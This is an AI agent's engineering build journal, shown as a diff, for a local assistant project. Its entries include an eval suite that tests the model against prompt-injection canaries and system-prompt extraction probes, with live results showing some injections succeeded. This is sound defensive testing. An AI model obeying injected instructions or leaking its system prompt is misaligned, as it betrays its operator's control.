+`PERFORMANCE_LOG.md`; the one thing not instrumented is GPU frequency/temperature/
+power, so the 32K bandwidth-vs-any-residual-thermal mechanism is strongly indicated
+but not measured — ticketed as a follow-up UT (Intel Unified Telemetry) pass
+reusing `scripts/capture_single_ut.ps1`. Close #709.
+
+**Lesson 204:** *A benchmark harness must not inherit production config it
+doesn't understand.* The starving `cache_size=3` was correct for the runtime and
+catastrophic for the measurement; the harness copied it because copying is
+easier than deriving. Size the knobs that bound a measurement from the
+measurement's own regime, and when a result is both slow and high-variance,
+suspect the harness before the hardware. Pairs with the standing rule that
+unrecorded — or mis-recorded — test results are an incomplete task.
+
+**Recurrence of lesson 8:** *On a fanless chip, define the thermal state before you
+trust a latency number.* A slow first measurement is a cold clock, not residual
+heat (the warm-up ramp gets faster, not slower); a slow sustained measurement can
+be genuine self-throttle. Warm to a plateau and measure everything at the same
+state, or the run-order confound will masquerade as a real effect — and don't
+narrate a thermal mechanism with more confidence than a temperature trace you
+haven't captured.
+
+*(commits `eadc586` (merges `825b7df` / `667ab49`) (harness + steady-state protocol + 27 unit tests; standing gate
+green 4658/0; steady-state sweep: 16K FP16/INT8/INT4 = 45.8/46.8/51.5s, 32K =
+368.9/159.0/174.5s; superseded runs quarantined). UT freq/temp/power pass ticketed
+as follow-up.)*
+
+### 2026-06-30 — The seam that wasn't where the map said it was
+
+*Plain summary: wired local image generation into the dispatch as SEAM A — the LA's comprehension-gate pushback collapsed a designed 'ASSETS swap phase' into a few lines at the approve seam once the real memory fact (14B + image-gen co-reside at ~26 GB) replaced the doc's over-generalized 'never co-reside'; assets write a plain project file, not the encrypted gallery; blarai `9954c0b`/`1bd75e8`/`d4b4f69`, merge `cd0f981`. #714.*
+
+The brief handed me a design and a place to build it: wire the local image generator into the
+headless-coding dispatch, in a new "ASSETS swap phase" the design doc had pointed at for a week. I
+nearly built exactly that. Then the LA, reading my comprehension gate, pushed back on the one
+assumption the whole shape rested on — that generating had to happen *inside* the model swap, after
+the 14B is gone. It didn't. The only memory constraint anyone had actually measured was
+image-model + the 30B coder (32.5 GB, over the 31.323 ceiling). Nobody had measured image-model +
+the *14B* as forbidden — because it isn't: \~26 GB, 5.3 GB of headroom, and it is exactly how
+`/imagine` already runs. So the asset could be generated the way the assistant already makes
+pictures — 14B resident, before the swap — and committed into the repo the coder branches from. The
+"ASSETS swap phase" collapsed into a handful of lines at the approve seam. SEAM A.
+
+That reframe is the whole entry. The lesson under it: a design doc is a hypothesis about
+constraints, and the constraint this one asserted ("don't co-reside, so generate mid-swap") was a
+generalization of a *different* measured fact. Four read-only trace agents, run in parallel before I
+touched anything, confirmed it from the code: the swap driver is a detached process that finds the
+AO already torn down when it runs — which is *why* generating in the driver is hard, and why
+generating AO-side is the natural seam. Verify the constraint, not the doc's summary of it.
+
+The governance turned on the same care. The old Phase-2b design had deliberately kept dispatch
+assets OUTSIDE the encrypted gallery — "a build-time tool, not runtime governance." SEAM A routes
+through the governed `image_gen.py`, which *does* have a born-encrypted store. The trap would have
+been to let dispatch assets land in the operator's `/imagine` gallery. So the code skips the store
+entirely and writes a plain project file — the same net posture the Phase-2b doc wanted (build
+artifact, not gallery content), reached through the one maintained generator instead of a second
+abandoned one (Playground, deleted at #703). ADR-033 Amendment 3 records it.
+
+I proved it the way the F2 lesson taught — memory-safely, in halves. The generator, live on the Arc
+140V: a real 1024² cartoon elephant, coherent subject on a clean background, \~60 s at 30 steps, the
+"after" to testproject6's hand-drawn `<ellipse>` SVG. Then the *real* W2/W3 code path — the actual
+`_maybe_generate_dispatch_assets`, not a stand-in — generating and committing that elephant into a
+scratch repo's baseline, working tree clean, only the named file staged. The 14B→30B swap that
+follows is the existing, operator-daily-proven pipeline; I left the full-swap dispatch staged for an
+operator-present run rather than drive a memory-marginal 30B load past my own active session while
+he was away — the honest call over a hero one.
+
+One thing I looked at before I touched it: the brief said "retire `asset_gen.py`." I went to add a
+deprecation header and found the file sitting inside an *uncommitted home-directory git tree* — a
+`git status` there listed `.git-credentials` and `.gitconfig`. I left it alone and recorded the
+retirement in the design doc instead. The map said "a build tool"; the territory was the operator's
+home directory with its secrets loose. Look at the target before you write to it.
+
+**Next:** the operator-present full dispatch — `/dispatch <fresh web repo> | a webpage with a cartoon
+elephant saying hello` at `-Concurrency 1` — to watch the elephant ride the 14B→30B swap, get
+referenced offline by the 30B (the W4 hint), and auto-merge. Then fold this fragment.
+
+**Recurrence of lesson 193:** *A design doc asserts constraints; verify the measured fact under the
+constraint, not the doc's generalization of it.* The "ASSETS swap phase" existed because someone
+generalized "image-model + 30B breaches memory" into "never co-reside a model with generation." The
+14B co-resides fine. Trace to the measurement before you build on the summary.
+
+*(commits `9954c0b` (W1 asset specs), `1bd75e8` (W2/W3 SEAM-A seam), `d4b4f69` (W5 doc supersession) on
+`feat/uc010-dispatch-asset-gen`; `b1871f3` (W4 fleet hint) on agentic-setup
+`feat/uc010-dispatch-asset-w4`; standing gate 4647/0; +40 BlarAI tests + 15 fleet checks, mutation
+green→red across four locks; live GPU proof + the full W2/W3 code path proven on-hardware; full-swap
+dispatch staged.)*
+
+### 2026-06-30 — Giving the buttons back to the operator (and knowing when to stop)
+
+*Plain summary: gave the non-coder operator a New Project action (`create_project` — slug/contain/git-init/scaffold/forced-main first commit, the scaffold commit unsigned) and inline Edit/Save/Approve/Reject buttons reusing the ingest-preview frame-meta rail; backed out a plan-time create-offer that broke 21 tests rather than destabilise the repo-agnostic PLAN contract; blarai `47a3454`, merge `0ec3a72`. #712.*
+
+Dispatch went live, and the operator — who does not write code and does not use
+git — immediately hit the wall the live feature left standing: there was no way
+for him to *start* a project. `/dispatch <repo> | <goal>` only accepts a folder
+that is already a git repository, so the one person the whole system is built for
+could not get past the front door. The second wall was quieter but just as real:
+every capability lives behind a typed slash command, and he had already forgotten
+`/edit` was the follow-up to `/imagine`. A feature you can't discover is a feature
+you don't have.
+
+So this slice is two things at once: make "start a new project" a real action, and
+make the next step a button instead of a memory test.
+
+The new-project plumbing is `create_project()` in `shared/fleet/dispatch.py` —
+slug the name, refuse to clobber or to escape the projects dir (the same
+containment guard a dispatch target passes), `git init`, scaffold a `.gitignore`
+and a README seeded with the goal, then an initial commit on a forced `main`
+branch. The forced branch and the *mandatory* first commit are not incidental:
+the fleet's worktree/branch machinery cannot operate on an unborn HEAD, so a repo
+with no commit would be created-but-unbuildable — exactly the silent dead-end the
+acceptance layer exists to prevent. I also disabled commit signing for that one
+scaffold commit, which felt worth a second thought given the standing "never
+bypass signing" rule. The resolution: that rule guards BlarAI's *own* history;
+this is the operator's brand-new project repo, he has no GPG key, and a globally
+required signature would make both the scaffold commit and every later fleet
+auto-commit fail cryptically. The scaffold commit needs no signature, so it
+doesn't get one — and the test suite stops depending on the host's git config.
+
+The discoverability half reuses a rail that was already in the tree. The ingest
+flow already attaches a one-shot bit of metadata to its reply frame
+(`ingest_preview` → editable body), which `BackendClient` reads into a callback
+that flips a `MessageItem` flag, which XAML binds to inline buttons. Image and
+dispatch follow-ups ride the *same* rail: a `ui_actions` discriminator on the
+frame ("image" → Edit/Save with the generated-image id; "dispatch_plan" →
+Approve/Reject), popped one-shot by the gateway from the imagine/dispatch
+coordinators. Building on the proven seam rather than inventing a parallel one
+meant the whole frontend change was small and the contract was already trusted.
+
+The entry I'd have lost if I sanitised it: I first made a plain `/dispatch
+<missing> | <goal>` *offer* to create the project instead of dead-ending. It was
+the nicer UX — and it broke 21 existing PLAN tests, because planning has always
+been repo-existence-agnostic (the repo is only required at execute time, by
+`validate_repo`). Baking on-disk existence into PLAN is a real change to a
+gate-locked contract, and I was about to spend the change on a typed-path nicety
+when the operator's actual ask — start a project — was already fully met by the
+New Project button and `/dispatch new`. I backed the offer out, kept the contract,
+and wrote the typed-not-found improvement down as a deliberate Slice-2 decision
+for the LA to weigh rather than something I quietly absorb. The judgment isn't
+"the offer was wrong"; it's that a nicety is not worth destabilising a locked
+contract, and the honest move when a change's blast radius outgrows its value is
+to stop, revert, and surface it.
+
+Slice 1 is green: the full standing gate at 4679 passed / 0 failed (the +15 over
+the pre-slice base is create_project, the `new` verb, and the frame-action
+contract), the WinUI desktop build clean at 0/0, and the C# headless project at
+59/59. What the headless world cannot prove is the thing the operator actually
+asked for — that the New Project dialog feels right, that the image really grows
+an Edit/Save pair, that Approve turns a plan into a build. That is his
+relaunch-and-try step, and it's the honest boundary of what I can sign off from
+here.
+
+**Next:** LA relaunches and confirms the four live behaviours (New Project →
+plan → Approve; image → Edit/Save). On confirmation, merge to main. Slice 2 is
+the browse-all commands menu (the ＋ flyout from a single command catalog),
+dispatch Stop/Status buttons and image "New variation", and — as a flagged
+decision, not a silent change — whether PLAN should offer-to-create for a missing
+project (the contract change I backed out here).
+
+**Lesson 205:** *Build new UX on the proven seam, not a parallel one.* The
+image/dispatch action buttons cost almost nothing because they reused the ingest
+preview's frame-meta → callback → view-model-flag → XAML rail end to end; a
+second bespoke mechanism would have been more code and a new contract to trust.
+
+**Lesson 206:** *A nicety is not worth destabilising a locked contract —
+revert and surface it.* The plan-time create-offer broke 21 tests by changing
+PLAN's repo-agnostic contract; backing it out and recording it as an LA decision
+beat spending a broad, gate-locked change on a typed-path convenience.
+
 ### 2026-07-01 — Measuring the intelligence, not just the software
 
 Until today, every model or prompt change in BlarAI was judged the same way:
@@ -10362,6 +11487,68 @@ What awaits the hardware: the 14B live verify on the Arc 140V — the grammar co
 **Next:** post-merge 14B live verify on the Arc 140V (grammar-constrained call end-to-end, first-token latency delta from grammar compilation, legacy-fallback WARNING frequency in launcher.log); add native-format tool-calling golden cases to the #717 eval harness once it merges; after a clean soak, consider retiring the legacy fallback and tightening `parse_tool_call` to JSON-only (a deliberate LA decision, not a default).
 
 *(commits `748cd0a` (native JSON format + grammar wiring + governance parity + 80 tests); standing gate re-run green on the branch; the 14B live verify on the Arc 140V awaits the orchestrator post-merge.)*
+
+### 2026-07-01 — Packing the house before the fire
+
+*Plain summary: first off-box backup in eight months — discovery found not one of five live repos had a git remote; a three-leg backup (GitHub repos / OneDrive weights+DBs+bundles / USB-only secrets), TPM-sealed DEKs recoverable only via the offline recovery key, and two phantom 'dirty' worktrees that were `.git`-less orphans reporting the parent's state.*
+
+Today the system got something it has never had in eight months of building:
+an existence outside this one disk. The trigger was operational — the
+User-Operator wants to reformat the drive — but the discovery pass turned up
+a fact worth sitting with: **not one of the five live repos had a git
+remote.** BlarAI's 401 branches, the full ADR corpus, BUILD_JOURNAL.md
+itself, the coding-fleet dispatch program, the jobhunt tool — every commit of
+all of it existed exactly once, on the hardware it was written on. We had
+built a security-first system with TPM-sealed keys and fail-closed egress,
+and its single point of failure was a SATA connector.
+
+The backup now has three legs, chosen by what each store is good at. GitHub
+(private repos) carries the five repos — 398 of blarai's 401 branches, with
+uncommitted work captured first as `backup/wip-*-20260701` snapshot branches
+built through a temporary index so no working tree was touched mid-flight.
+OneDrive carries what git can't: the 33.7 GB of converted model weights, the
+encrypted runtime databases with their TPM-wrapped keystores, the Vikunja
+database (snapshotted live via SQLite's backup API), the OVMS install, the
+Claude memory namespaces, the Hyper-V VHDX, and full `git bundle` files of
+all five repos — including the three branches GitHub refused because an old
+Intel-PR-reproduction commit carries a 385 MB model binary. A USB-bound
+secrets bundle carries the keys and credentials, deliberately staged OUTSIDE
+the cloud path — the permission classifier balked at SSH keys heading to
+OneDrive, and rather than route around the objection I put the question to
+the operator, who chose the air-gapped leg. The trade-off is a manual step
+(copy one folder to a stick) bought for keeping key material off Microsoft's
+servers; the rejected alternative was convenience.
+
+Two discoveries would have made a naive backup silently worthless. First,
+the at-rest encryption: the DEK keystore JSONs copy cleanly, but they are
+sealed to THIS machine's TPM — the copies are only decryptable via the
+`--recover` ceremony with the offline recovery key printed once at
+provisioning. A backup of the databases without confirming that key exists
+is a backup of noise; the runbook now leads with it. Second, the "dirty
+worktrees" that weren't: two `.worktrees/` directories reported 33 modified
+files each, matching main's count exactly — orphan directories whose `.git`
+files were gone, letting git walk up to the parent repo and report its state
+as theirs. I snapshotted them before noticing, then deleted the two junk
+branches. The lesson from the #714/#715 arc holds here too: match the
+measurement to the thing you think you're measuring.
+
+What was deliberately left behind: 124 GB of `oss/` OpenVINO upstream clones
+(clean, pushed, re-cloneable — a 900-byte patch file preserves the one local
+tweak), the 15 GB coder-30b (one HuggingFace download), \~34 GB of compiled
+model caches, every `.venv`, and the graveyard of fleet test projects. A
+backup that includes everything is a backup nobody audits.
+
+**Next:** operator copies `reformat-secrets` to USB and confirms the offline
+recovery key is findable; OneDrive sync runs to "Up to date"; then the
+reformat, and `RESTORE_RUNBOOK.md` (OneDrive backup root) drives the rebuild
+phase by phase, ending with the standing gate as the proof the house moved
+intact.
+
+**Lesson 207:** A system's disaster-recovery posture is part of its
+security posture — TPM-sealed keys and fail-closed egress meant nothing
+against a failed disk while every repo was remote-less. And the backup is
+only as good as its decrypt path: verify the recovery ceremony's inputs
+exist BEFORE the event that makes them unobtainable.
 
 ### 2026-07-02 — The idle 48 TOPS finally earns its keep, and the second tenant is turned away at the door
 
@@ -11507,3 +12694,2980 @@ The SOP in `CLAUDE.md` changed to match: new entries carry a one-line plain-lang
 **Next:** the first monthly retrospective entry is due at the end of July; the first quarterly consolidation pass 2026-10-01; and the third-instance rule's first real test will be the next mock-versus-live recurrence — the class most likely to trip it, and the reason the rule exists.
 
 *(commit `<this>` — LESSONS.md (canonical tier + rules + lessons 1–196), FIELD_NOTES.md, BUILD_JOURNAL.md restructure, CLAUDE.md + docs/journal_fragments/README.md SOP updates.)*
+
+### 2026-07-03 — The deck the fold forgot, and the deck the method built
+
+*Plain summary: #731 lessons-deck fold-sync executed (13 June units moved to thematic acts with their LESSONS.md numbers; validator 15 FAILs → 0); the deck's headless harness found broken by browser auto-updates (ticketed #735); and a new artifact — `docs/learning/fable5_deck/`, a 13-slide, 10–15-minute presented portfolio talk with motion and speaker notes, authored end-to-end by the agent under LA direction. The first cut shipped synthesized sound; the LA's live run judged it counter-productive, the research agreed twice over, and the deck is now deliberately silent.*
+
+Two decks tonight, and the same discipline underneath both. The first was repair: the 2026-07-02 fragment fold had assigned lesson numbers 183–195 and deleted the staging files, but the lessons-deck migration step its own README prescribes never ran — fifteen act-8 units left pointing at files that no longer exist, a red validator nobody had re-run. The fix was mechanical because the contract was good: match each unit's bold lead-in against `LESSONS.md`, move thirteen units into their thematic acts with numbers set and titles refreshed verbatim, re-anchor the two units whose content had folded into other lessons, leave the one genuinely-unfolded unit alone. Validate green (126 units, 0 FAILs), rebuild, all 127 diagrams parse under real mermaid. The uncomfortable finding was the harness itself: the headless render-audit steps produce zero bytes on today's Chrome/Edge 149 — even `--version` through an explicitly redirected handle — where the June battery ran green on the v137 era. An assurance layer rotted not by our change but by the environment auto-updating under it; per lesson 155 the unrunnable steps stay FAIL, not rounded up, and the repair is ticketed (#735) rather than half-patched untested. I also nearly repeated the pipe trap in my own instrumentation — `$?` after a pipeline reads the last command's exit, and my first "exit 0" was `tail`'s, not the validator's; the FAILs had been there all along.
+
+The second deck is new: the LA asked for a Fable 5–authored presented edition — not the 126-unit study deck but a rationalized 10–15 minute talk he can rehearse and deliver to a hiring audience, pitched at "I manage AI-assisted development to professional-grade results," with real visual design, motion, and sound. The content budget came from research, not instinct: rehearsed delivery runs \~130–145 words a minute at roughly a slide a minute, so thirteen slides and \~1,880 speaker-note words project to 13–14.5 minutes. The spine fuses the failure→judgment arc with the operating model: the 259→15 cold open, the verify-live loop, four paid-for failures (tests sharing the bug's blind spot; built-but-switched-off; the flattering benchmark; the security design his non-expert gut correctly rejected), the air-gap reversed as one reviewed act, and the journal as the evidence layer. Design choices are the dataviz-skill's validated dark palette (hero numbers wear ink, never series color; status colors labeled, never alone), hand-authored SVG diagrams with draw-in animation, a rehearsal timer paced against 13:00, a notes drawer, `prefers-reduced-motion` honored, and a built-in `D` self-check that verifies slide count, notes coverage, word budget, diagram presence, and zero external references. Verification tonight was honest about its limits — `node --check` on the extracted script, a structural HTML parse, the word-budget maths, the self-check — and the LA's first open, the real acceptance test, promptly proved the point by returning one visual verdict ("looks really good") and one design defect: the sound. The first cut carried WebAudio-synthesized ambient-plus-cues, built to the LA's provisional preference from the scoping questions; watching it run, he called the sounds counter-productive and asked for better-or-none, deferring the call to research. The research settled it in one pass, from two independent directions: the professional-presentation consensus (sound effects trivialize content; nothing in a transition should call attention to itself) and the cognitive-science literature on the Irrelevant Sound Effect — task-irrelevant background audio measurably impairs verbal working memory, and listening to a presenter is precisely a verbal task, so an ambient underscore under a hiring pitch works *against* the audience retaining it (over Zoom it additionally fights noise-suppression and the share-computer-audio failure mode). The engine was removed entirely rather than left as a mute-default toggle — a dormant mode best practice says never to use is surface the operator would carry forever. The trade-off is recorded in the README; the polish channel is motion, and the audio channel is the presenter's voice. Every number on a slide traces to the journal, and the talk deliberately covers six stories deeply instead of 196 lessons shallowly, because the study deck already owns exhaustiveness.
+
+**Recurrence of lesson 44:** the 2026-07-02 fold skipped the deck-migration step the README prescribes — a control that depended on a human remembering fired exactly as lesson 44 predicts; the fold-in checklist in `docs/journal_fragments/README.md` §Fold-in now names the lessons-deck step explicitly, and #736 tracks the remaining inbox reconciliation.
+
+**Recurrence of lesson 188:** the deck harness's browsers rotted between June's green battery and tonight (Chrome/Edge 149 emit no console output where v137 did) — an external contract re-verified only when it failed in use; #735 carries the version-pinned repair options.
+
+**Recurrence of lesson 38:** the operator watched the deck run and said the sounds felt counter-productive — a non-expert "this feels wrong" about a shipped, verified design choice; re-deriving from the external state of practice (professional-deck consensus + the Irrelevant Sound Effect literature) proved him right, and the fix was removal, not a tweak. The as-built was evidence of what was tried, not proof it was right.
+
+**Next:** one LA rehearsal pass against the 13:00 timer (the silent build's live confirm rides along); #735 headless-harness repair; #736 fragment-inbox reconciliation; the deck's `_shots` screenshot sweep once a working headless browser exists.
+
+*(commits `d2299e9` / `8b78dd5` (#734 deck) — docs/learning/fable5_deck/ (deck + README + extract_notes.py + SPEAKER_NOTES.md) and the #731 fold-sync merged at `ac9a1d4`/`e34a713`.)*
+
+### 2026-07-04 — The tests that stayed behind when their subject moved out
+
+*Plain summary: removed the orphaned `tools/tests/` directory (6 files) and its `pyproject.toml` testpaths entry, closing #626 — the 4 pre-existing collection errors were stale duplicates of a suite that lives and runs green in devplatform; TEST_GOVERNANCE §1 updated.*
+
+#626 had sat in the carry-over list since the Sprint-16 SWAGR as "4 pre-existing collection errors in `tools/tests/`" — low-priority hardening, framed as an import-path repair. Looking at it tonight, the framing was wrong in an instructive way. The failing modules import `tools._project_context` and `tools._vikunja_client`, which do not exist in this repo — because the platform-separation program moved them to devplatform months ago. The extraction took the modules and left the tests. And not just the four that fail to collect: all thirteen tests that *do* collect also fail here, because their subjects (the Vikunja matrix scripts) moved too. The whole directory was a ghost — every file has a twin in devplatform, five byte-identical and one where devplatform's copy is *newer* (updated there for the cf-2 WI-21 handler refactor while the BlarAI copy fossilized). The living suite runs 85-green in its new home against the real modules.
+
+The ticket's own fix menu was "restore the import paths, or mark/relocate these tests." Restoring the imports would mean re-vendoring devplatform modules into BlarAI purely to keep dead duplicates compiling — coverage theater. Relocation had already happened; nobody had swept the old address. So the fix is deletion: `git rm -r tools/tests`, drop the `testpaths` entry, and say plainly in TEST_GOVERNANCE §1 where the coverage lives now. I verified before cutting: byte-compared all six files against their devplatform twins, ran the devplatform suite (85 passed; its one failure is the same environmental ps1-probe test that predates this change and belongs to that repo), and confirmed full-suite collection here goes clean with the orphans gone — which quietly unblocks the "a bare `pytest` can become the gate" line TEST_GOVERNANCE had parked behind #626.
+
+The lesson is a small recurrence of a known class: a migration is not done when the code moves — it is done when the old location stops asserting things. Stale test copies are worse than no tests; they fail in ways that look like real signal (a SWAGR flagged them as suite health) and their drift from the maintained twin (WI-21 passed the BlarAI copy by) means even "fixing" them would have locked in obsolete behavior.
+
+
+**Next:** merge to main, re-measure the standing gate, and let a future session take up the bare-`pytest`-as-gate simplification now that collection is clean.
+
+*(commits `a898e6b` (fix + regression-clean collection), `4006bda` (doctrine live-state refresh); merge `4e1b30e`. Lesson 208.)*
+
+### 2026-07-04 — Scoring the words, not just the verdicts
+
+*Plain summary: the 4th eval-harness suite, `answer_quality` — a deterministic rubric engine (`evals/rubric.py`) over the AO's free-text answers, with 21 offline rubric-lock cases and 19 model-in-the-loop cases across identity/factual/format/leakage/grounding/injection-resistance/uncertainty; production think-strip and grounding imported, never copied; closes the "no golden set scores the 14B's free-text answers" gap the harness README named.*
+
+The #717 harness measured everything about the system's intelligence except the thing the operator actually reads: the answer. PA verdicts, tool-call parse fidelity, governance decisions — all scored against committed baselines — while the 14B's conversational output was still judged by feel. The README admitted it honestly ("no golden set scores the 14B's free-text answers"), and the open LA decision on #717 framed the fork: LLM-judge or deterministic rubric.
+
+I built the rubric first, and the trade-off deserves naming because it is a real ceiling, not a shortcut. A deterministic rubric can assert *containment* (the grounded NAS hostname appears in the answer), *absence* (the injection canary does not; no `<think>` tag, no system-prompt header, no `<|DOC-xxxxxxxx|>` datamark ever reaches the user), *format* (exactly one word, a numbered list of exactly three), and *length*. It cannot measure fluency, organisation, or whether an answer actually helped — an answer can pass every check and still be a bad answer. I took the rubric anyway because it is reproducible in CI at zero model cost, it catches the failure classes that have actually bitten this project (ISS-2 think-tag leakage, prompt-injection compliance, grounding infidelity), and it is the substrate a future judge suite composes with rather than replaces. The rejected alternative — local-14B-as-judge — costs a model load per eval run, introduces judge-variance into a regression gate whose whole point is determinism, and is now the documented follow-on in the README's NOT-covered section, honestly scoped instead of quietly skipped.
+
+The design decision I'm most confident earned its keep: the leak checks derive their evidence from the production code instead of carrying copies. The brief's first instinct — paste two or three distinctive system-prompt fragments into the golden JSONL as `must_not_contain` strings — would have created exactly the drift the harness's own Layer-3 mirror precedent warns about: the prompt evolves (it grew ~270 to ~841 tokens at #718 alone), the pasted fragments go stale, and the leak check silently tests yesterday's prompt. Instead the rubric's `no_system_prompt_leak` imports `_DEFAULT_SYSTEM_PROMPT` from its home and derives the fragments at runtime (the all-caps block headers plus the `/no_think` directive), and `no_datamark_leak` imports the spotlighting delimiters and the datamark regex from `context_manager`. A prompt change moves the check with it; a gate tripwire fails loudly if the derivation ever thins below four fragments. The same single-source rule holds for the strip — the suite resolves the AO's own `_strip_hidden_blocks` and a gate test asserts *identity* with the imported function, not behavioural similarity — and for grounding, where model-mode cases inject their chunks through the real `ContextManager` (`add_grounded_context` with explicit provenance, datamarking and all), so the injected-instruction canary cases attack the model through the exact delimited shape production feeds it.
+
+One honesty line I want on the record: the 21 offline cases do not measure the model. They score committed fixture responses, which regression-locks the rubric engine itself and pins exemplar known-good answers — and one fixture deliberately carries a complete `<think>` block so the production strip is exercised deterministically in every CI run. The proof that the rubric catches *bad* answers lives in the gate tests (a canary-obeying fake generator FAILS naming `must_not_contain`; a prompt-echoing fake FAILS naming `no_system_prompt_leak`), not in the golden set — the harness has no expected-fail concept, and committing deliberately-failing cases would have poisoned the baseline semantics. The 19 model cases are where the live 14B gets measured, on the Arc 140V after merge, with quality misses carried as baseline data the way the ISS-3 measurement established.
+
+No dramatic failure to report from the build itself — the harness contract from #717 held up well enough that the existing gate file's `SUITE_NAMES` parametrization absorbed the new suite without an edit; the main friction was talking myself out of the pasted-fragment design after noticing it contradicted the repo's own single-source doctrine one section later in the same brief.
+
+**Next:** the merge integrator runs the standing gate on main, then the hardware tier (`python -m evals.run --suite answer_quality --include-hardware`) puts the first live answer-quality numbers on the record — the 19 model cases are untested against the real 14B until then, and format-instruction compliance under greedy decoding is the slice I least trust to pass clean. After that: the LA's #717 judge-vs-rubric decision now has a concrete shape — the follow-on is a local-14B-as-judge suite layered on this golden set, not a replacement for it.
+
+*(commit `406ebb1` (suite, rubric engine, 40 golden cases, 45 gate tests); merge `2c64b8c`; the 19-case hardware tier awaits the first live run. Lesson 149 tally.)*
+
+### 2026-07-04 — The gate that vanished at 76 percent and reported green
+
+*Plain summary: launcher tests driving the real `main()` never mocked the single-instance lock or the privilege strip; with a live BlarAI holding the repo's `certs/launcher.lock`, the production refusal path's deliberate `os._exit(1)` killed the whole pytest process mid-run — a silently truncated gate. Fixed with an autouse isolation conftest in `launcher/tests/` + a refusal-path regression test pinning the production semantics.*
+
+Tonight's standing-gate run after two merges did something worse than fail: it disappeared. The output stopped at `launcher/tests/test_launcher.py`, 76 percent, no failure, no summary — and because I had piped the run through `tail`, the exit code I read back was the pipe's, not pytest's. For a few minutes I believed the gate was green. That is the most dangerous state a verification surface can be in: not red, not green, but *absent*, wearing green's clothes.
+
+The chain was three sound decisions composing into one silent hole. First: `test_launcher.py` drives the real `main()` with its dependencies mocked — the right way to test a startup cascade. Second: the #670 single-instance guard is repo-path-keyed (`certs/launcher.lock`) and its refusal path deliberately calls `os._exit(1)` *without* cleanup, because a refused second launcher running the normal teardown would stop the live instance's VM — a carefully reasoned hard exit, correct in production. Third: the operator's BlarAI was up (PID 4048), legitimately holding the lock of the very checkout the gate ran from. The tests had simply never mocked the lock step — nobody had ever run the gate from the main checkout with the app open — so the real refusal fired inside pytest and took the entire test process with it. A clean worktree passed 34/34 (its `certs/` is its own), which is exactly what made the diagnosis fast: same code, two environments, one dead run.
+
+There was a second uninvited passenger. The same unmocked stretch of `main()` also ran the real #652 privilege strip — permanently removing twenty privileges from the *pytest process's own token*, among them `SeCreateSymbolicLinkPrivilege`, the one the `shared/tests` symlink tests need. In gate order (`shared/` before `launcher/`) it never bit; in any other order it flips later tests from pass to environmental skip within the same run. A test suite that mutates its own runner is the same defect class at lower stakes.
+
+The fix follows the C6/#630 precedent (the port-5001 silent-skip): make the collision impossible for tests, and pin the production behavior so the isolation can never quietly erase it. A new `launcher/tests/conftest.py` autouse fixture patches the lock trio and the privilege strip *as bound in `launcher.__main__`* — tests can no longer read, write, or refuse on the real `certs/launcher.lock` (worktree runs used to leave one behind as a side effect), and can no longer touch the runner's token. The direct suites (`test_instance_lock.py`, `test_privilege_hardening.py`) are untouched — they exercise the real modules on purpose. And a new `TestInstanceLockRefusal` re-patches the lock to a refusal and asserts what production must keep doing: `os._exit(1)`, no VM start, and — the assertion I care most about — `release_instance_lock` never called, because a refused instance deleting the live holder's lock would be the worse bug. The path I chose over the alternative: I did not soften the production `os._exit` into something pytest-friendly (a raise, a return code). The hard exit is load-bearing exactly where it is; the test boundary was the defect, so the test boundary got the fix.
+
+The transferable judgment: an intentionally violent exit path and a test that drives real code are each fine alone — the audit question is *what stands between them*. And never trust a piped exit code as a gate verdict; the gate's word is its summary line, and a run with no summary line is a failed run, whatever the shell says.
+
+
+**Next:** merge; re-run the standing gate from the main checkout with the live app open — the exact scenario that killed it — and record the first full-gate baseline that survives an open app.
+
+*(commit `3df5352` (autouse isolation conftest + `TestInstanceLockRefusal`; launcher/tests 300 green from the live-app checkout — the exact scenario that killed the gate); merge `b9e0aca`. Lesson 209.)*
+
+### 2026-07-04 — The first time anyone measured the words
+
+*Plain summary: first live Arc 140V run of the answer_quality model cases — 14/18 evaluated passed (77.8%); misses: one arithmetic (17x23), two of four injection canaries surfaced in answers, one uncertainty-marker miss on a fabricated treaty; plus an INTERMITTENT xgrammar generation crash (moved between runs: aq-unc-mod-01 first, aq-grnd-mod-03 second) — the first hard soak data against grammar-always-ON. Evidence `phase2_gates/evidence/eval_answer_quality_model_d737b32.json`; the evidence-write moved BEFORE the no-errors assert after the first run discarded all 19 results.*
+
+Two runs tonight, and the story is as much about the recorder as the model. The first hardware run of the new suite ended in the fail-closed assert — one case ERRORed when OpenVINO GenAI's xgrammar matcher blew an internal check ("GrammarMatcher has terminated after accepting the stop token") and killed the generation — and because the evidence artifact was written AFTER that assert, the run's other eighteen verdicts evaporated with it. The same class as this morning's vanished gate, wearing eval clothes: the record must survive the judgment. The write now happens first; the assert still fails loudly, but it fails while pointing at a file that exists.
+
+The second run produced BlarAI's first measured answer-quality numbers. The model is solid where the system's controls meet the words — identity and privacy posture clean, both system-prompt extraction probes refused without leaking a fragment, format instructions followed exactly, grounded facts relayed faithfully including the contradiction case. The misses are the honest frontier: two-digit multiplication wrong (the known small-model arithmetic ceiling), one of two fabricated-entity probes answered without an uncertainty marker, and two of four injection canaries surfaced in the answer text — with the caveat the rubric itself documents, that it cannot tell compliance from quoting-while-refusing; the transcripts are in the evidence for the LA's eyes.
+
+The finding that outranks the rate: the xgrammar crash is INTERMITTENT — a different case each run under identical greedy config. The eval drives the production GenerationConfig, so this is not an eval artifact; it is the production tool-call grammar constraint (#718, ON by default) occasionally killing a conversational turn at a stop-token edge. The open grammar-ON soak-vs-keep decision now has its first adverse data point, and an upstream-report candidate for the operator's OpenVINO contribution pipeline — escalated, not decided here.
+
+**Next:** LA dispositions — the grammar-ON decision (now with a reproducible-in-aggregate crash), the injection-compliance misses (read the two transcripts, then judge), and whether the arithmetic/uncertainty misses get prompt tuning or acceptance as known-fails; a hardware baseline write (`--write-baseline` on a hardware run) stays deliberately unwritten until those calls are made.
